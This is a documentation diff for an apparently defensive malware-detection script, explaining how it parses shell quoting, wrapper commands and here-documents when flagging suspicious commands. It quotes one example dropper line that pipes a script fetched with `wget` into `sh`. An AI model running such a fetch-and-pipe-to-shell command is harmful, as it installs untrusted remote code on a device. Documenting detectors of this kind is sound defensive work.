@@ -121,10 +121,12 @@ This script also detects:
     keep list, which are read line by line. Quotes are read as `sh` reads them (since
     2.54): a `;`, `&`, `|` or `#` inside a quoted string, as in
     `wget -qO- "http://…/ni.sh?id=1&arch=arm" | sh`, neither separates nor starts a
-    comment, unless the string is a command itself (after `sh -c`, `su -c`, `eval` or
-    `trap`, or from `$(` on in double quotes). A string over several lines is one command,
-    and the text of a here-document only counts where a shell reads it or it goes into a
-    crontab, `rc.local` or another file that starts programs. A script that keeps the
+    comment, unless the string is a command itself (after `sh -c`, `su -c`, `eval`,
+    `trap`, `watch`, `ssh`, `xargs` and the like, or from `$(` on in double quotes). A
+    string of data over several lines is one command. Where this could hide what `sh`
+    runs, the plain reading of 2.53 is used instead: in the text of a here-document, which
+    is read line by line as commands, for a string still open after 20 lines or at the end
+    of the file, and for a line of more than 4096 characters. A script that keeps the
     address in a variable and fetches from it in another command is therefore only
     `REVIEW`,
   - a process that runs one of the malware's files: as the program, under its name, as
